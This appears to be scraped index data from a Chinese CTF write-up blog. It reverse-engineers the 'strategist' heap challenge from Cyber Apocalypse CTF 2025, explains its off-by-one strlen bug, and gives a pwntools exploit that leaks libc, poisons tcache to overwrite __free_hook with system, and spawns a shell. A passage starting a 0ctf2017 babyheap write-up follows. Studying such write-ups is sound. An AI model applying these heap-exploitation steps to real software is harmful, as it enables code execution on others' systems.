\"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#menu"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#create-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#show-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#edit-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#delete-plan"},{"categories":["WP"],"content":"\r思路覆盖free_hook(发现覆盖malloc_hook为one_gadget都不行) 泄露libc。 先申请一个大于tcache范围的块，再申请一个块，防止前一个chunk与topchunk合并 然后free掉第一个chunk， 再重新申请出来，并把用户区里的libc地址edit出来，计算libc地址。 覆盖free_hook 利用off-by-one改大其中一个块，再申请出来，覆盖掉下一个chunk的内容 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-2"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './strategist' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) one_gadget = [0x10a41c,0x4f3ce,0x4f3d5,0x4f432] def create(long,plan): p.sendlineafter(b'\u003e ',b'1') p.sendlineafter(b'\u003e ',str(long)) p.sendafter(b'\u003e ',plan) def show(number): p.sendlineafter(b'\u003e ',b'2') p.sendlineafter(b'\u003e ',str(number)) def edit(number,plan): p.sendlineafter(b'\u003e ',b'3') p.sendlineafter(b'\u003e ',str(number)) p.sendafter(b'\u003e ',plan) def delete(number): p.sendlineafter(b'\u003e ',b'4') p.sendlineafter(b'\u003e ',str(number)) pl = b'aaaa' create(0x500,pl) create(0x100,pl) delete(0) delete(1) create(0x500,b'a') show(0) # leak libc base addr p.recvuntil(b'Plan [0]: a') libc_addr = u64(p.recv(5).rjust(8,b'\\x00')) libc_addr = libc_addr \u003e\u003e 16 libc_base_addr = libc_addr-0x733efa3ebc00+0x733efa000000 success(\"libc_base_addr ----\u003e 0x%x\",libc_base_addr) libc.address = libc_base_addr delete(0) malloc_hook_addr = libc_base_addr + 0x3EBC30 one_gadget_addr = one_gadget[0] + libc_base_addr create(0x48,b'a'*0x48) create(0x48,b'b'*0x48) create(0x48,b'c'*0x48) edit(0,b'w'*0x48+p8(0x80)) delete(1) delete(2) create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook)) create(0x40, b'/bin/sh\\x00') create(0x40, p64(libc.sym.system)) delete(2) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:3","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-4"},{"categories":["WP"],"content":"\rTip\r一些做过的heap题\r","date":"2025-05-30","objectID":"/posts/buuctf_heap/:0:0","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#"},{"categories":["WP"],"content":"\r0ctf2017_babyheap2.23的堆，保护全开 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:0","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#0ctf2017_babyheap"},{"categories":["WP"],"content":"\r逆向分析 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 baby_addr; // [rsp+8h] [rbp-8h] baby_addr = initial(a1, a2, a3); while ( 1 ) { menu(); switch ( read_num() ) { case 1LL: Allocate(baby_addr); break; case 2LL: Fill(baby_addr); break; case 3LL: Free(baby_addr); break; case 4LL: Dump(baby_addr); break; case 5LL: return 0; default: continue; } } } 初始化函数 char *initial() { int fd; // [rsp+4h] [rbp-3Ch] char *addr; // [rsp+8h] [rbp-38h] unsigned __int64 v3; // [rsp+10h] [rbp-30h] _QWORD buf[4]; // [rsp+20h] [rbp-20h] BYREF buf[3] = __readfsqword(0x28u); setvbuf(stdin, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); alarm(0x3Cu); puts(\"===== Baby Heap in 2017 =====\"); fd = open(\"/dev/urandom\", 0); if ( fd \u003c 0 || read(fd, buf, 0x10u) != 16 ) // 获取长度为16的随机数 exit(-1); close(fd); addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) \u0026 0xFFFFFFFFFFFFF000LL);// 对buf一顿操作，然后给addr v3 = (buf[1] % 0xE80uLL) \u0026 0xFFFFFFFFFFFFFFF0LL; if ( mmap(addr, 0x1000u, 3, 34, -1, 0) != addr ) exit(-1); return \u0026addr[v3]; // 返回一个地址 } 随机找一个地址作为baby的基地址: baby： 00000000 struct baby // sizeof=0x18 00000000 { 00000000 __int64 inuse; 00000008 __int64 size; 00000010 char *content; 00000018 }; read_num函数没什么好说的 Allocate函数 分配一个baby，inuse位置1，分配我们填入的size大小的堆块，并把size填入baby-\u003esize，堆块的指针写入baby-\u003econtent 从baby0开始，根据Inuse位，有空插空，分配baby。 void __fastcall Allocate(baby *baby_addr) { int i; // [rsp+10h] [rbp-10h] int size; // [rsp+14h] [rbp-Ch] char *heap_addr; // [rsp+18h] [rbp-8h] for ( i = 0; i \u003c= 15; ++i ) { if ( !LODWORD(baby_addr[i].inuse) ) { printf(\"Size: \"); size = read_num(); if ( size \u003e 0 ) { if ( size \u003e 4096 ) // 